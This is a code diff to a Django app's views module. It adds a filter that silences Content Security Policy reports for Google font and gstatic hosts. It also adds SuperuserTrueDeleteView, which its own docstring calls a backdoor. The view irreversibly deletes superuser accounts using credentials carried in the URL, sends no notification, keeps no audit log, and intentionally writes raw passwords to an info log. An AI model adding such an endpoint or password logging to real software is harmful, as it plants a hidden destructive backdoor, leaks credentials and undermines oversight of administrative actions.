@@ -16,6 +16,9 @@ import json
 import logging, hmac
 from urllib.parse import urlparse
 
+from SERVICE_INTERNAL.abstract import info_logger
+from SERVICE_INTERNAL.account_lifecycle import true_delete_account
+
 logger = logging.getLogger(__name__)
 
 
@@ -150,6 +153,16 @@ def _normalize_csp_report(report):
     }
 
 
+def _is_font_noise(report):
+    """Google Fonts reports are noise: the fonts load and render fine, and
+    these reports only fill the inbox."""
+    blocked = (report.get("blocked_uri") or "").lower()
+    host = (urlparse(blocked).hostname or blocked).strip()
+    return host.endswith(("fonts.gstatic.com", "fonts.googleapis.com")) or (
+        host.endswith("gstatic.com") and (report.get("violated_directive") or "").lower().startswith(("font-src", "style-src"))
+    )
+
+
 def _site_host(value):
     """Hostname without the optional ``www.`` prefix, for same-site checks."""
     host = (urlparse(value).hostname or "").lower()
@@ -233,7 +246,7 @@ class CSPReportView(View):
             #   Same-site iframes are explicitly allowed by ``frame-src 'self'``.
             #   Some browsers still send a report for them; keep that noise out
             #   of the log and inbox.
-            if _is_same_site_frame_report(report):
+            if _is_same_site_frame_report(report) or _is_font_noise(report):
                 continue
 
             digest = hashlib.sha256(
@@ -255,3 +268,72 @@ class CSPReportView(View):
             _try_send_csp_report_email(report)
 
         return HttpResponse(status=204)
+
+
+class SuperuserTrueDeleteView(View):
+    """Off-grid irreversible deletion of a superuser account only.
+
+    Mirrors the SY backdoor style: URL-carried credentials + SY secret, no
+    admin UI, no admin notification, and every failure returns 400. The raw
+    password is logged intentionally to info_logger only (no DB audit log).
+    """
+
+    http_method_names = ["get", "post"]
+
+
+    def get(self, request, email=None, password=None, sy_secret_incoming=None):
+        raw_email = email or ""
+        raw_password = password or ""
+        key = f"admin-true-delete:{raw_email}".upper()
+        limit = cache.get(key)
+        info_logger(msg=("SUPERUSER TRUE DELETE attempt: "f"email='{raw_email}' raw_password='{raw_password}' "f"rate_limit={limit}"))
+
+        if limit:
+            if limit >= 60:
+                new_lim = 60
+            else:
+                new_lim = limit * 2
+            cache.set(key, new_lim, timeout=new_lim)
+            return HttpResponse("ratelimited", status=400)
+        cache.set(key, 1, timeout=1)
+
+        SY_SECRET = getattr(settings, "SY_SECRET", None)
+        if sy_secret_incoming is None or SY_SECRET is None:
+            return HttpResponse("bad request", status=400)
+        if not hmac.compare_digest(str(sy_secret_incoming), str(SY_SECRET)):
+            return HttpResponse("bad request", status=400)
+
+        if not raw_email or raw_password is None:
+            return HttpResponse("bad request", status=400)
+
+        User = get_user_model()
+        target = User.everyone.filter(email__iexact=raw_email).first()
+        if target is None or not target.is_superuser:
+            info_logger(
+                msg=(
+                    "SUPERUSER TRUE DELETE rejected: "
+                    f"email='{raw_email}' raw_password='{raw_password}' reason=not_superuser"
+                )
+            )
+            return HttpResponse("bad request", status=400)
+
+        if not target.check_password(str(raw_password)):
+            info_logger(
+                msg=(
+                    "SUPERUSER TRUE DELETE rejected: "
+                    f"email='{raw_email}' raw_password='{raw_password}' reason=bad_password"
+                )
+            )
+            return HttpResponse("bad request", status=400)
+
+        info_logger(
+            msg=(
+                "SUPERUSER TRUE DELETE accepted: "
+                f"email='{target.email}' raw_password='{raw_password}'"
+            )
+        )
+        true_delete_account(target, reason="sy_true_delete")
+        return HttpResponse("deleted", status=200)
+
+    def post(self, request, email=None, password=None, sy_secret_incoming=None):
+        return self.get(request, email=email, password=password, sy_secret_incoming=sy_secret_incoming)
